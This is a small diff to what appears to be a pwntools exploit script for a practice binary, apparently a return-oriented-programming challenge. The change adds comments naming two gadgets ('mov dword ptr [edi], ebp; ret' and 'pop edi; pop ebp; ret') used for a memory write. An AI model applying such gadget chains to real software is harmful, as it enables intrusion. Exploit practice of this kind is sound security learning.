@@ -12,8 +12,8 @@ if args.ATTACH:
 	gdb.attach(p, '''break main''')
 
 data_addr = 0x0804a018
-mov_ptr_edi_ebp_addr = 0x08048543
-pop_edi_ebp_addr = 0x080485aa
+mov_ptr_edi_ebp_addr = 0x08048543 # mov dword ptr [edi], ebp; ret;
+pop_edi_ebp_addr = 0x080485aa 	  # pop edi; pop ebp; ret;
 
 p.recvuntil(b'> ')
 
